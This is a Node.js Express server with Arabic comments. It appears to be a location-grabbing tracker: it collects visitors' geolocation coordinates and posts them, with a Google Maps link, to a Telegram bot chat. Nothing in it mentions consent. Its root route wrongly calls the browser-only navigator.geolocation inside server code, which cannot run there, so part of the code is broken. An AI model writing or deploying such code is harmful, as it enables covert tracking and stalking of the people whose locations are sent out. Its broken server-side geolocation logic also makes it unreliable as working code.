const express = require("express");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // خزّن التوكن في متغير بيئة
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // نفس الشي للـ chat_id

// تقديم الملفات الثابتة (HTML, CSS, JS) من مجلد public
app.use(express.static(path.join(__dirname, "public")));

// إرسال الموقع إلى تيليجرام عند فتح index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));

  // استخراج إحداثيات الموقع من المتصفح تلقائيًا
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${latitude},${longitude}\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ${accuracy || "?"}m`;

        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
          });
        } catch (err) {
          console.error("فشل الإرسال إلى تيليجرام:", err.message);
        }
      },
      (error) => {
        console.error("فشل الحصول على الموقع:", error.message);
      }
    );
  }
});

// استقبال الموقع من المتصفح وإرساله إلى تيليجرام
app.post("/send-location", async (req, res) => {
  const { lat, lng, accuracy } = req.body;
  if (!lat || !lng) return res.status(400).json({ error: "Missing coordinates" });

  const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy || "?"}m`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
    });
    res.json({ ok: true });
  } catch (err) {
    console.error("فشل الإرسال إلى تيليجرام:", err.message);
    res.status(500).json({ error: "Telegram send failed" });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});
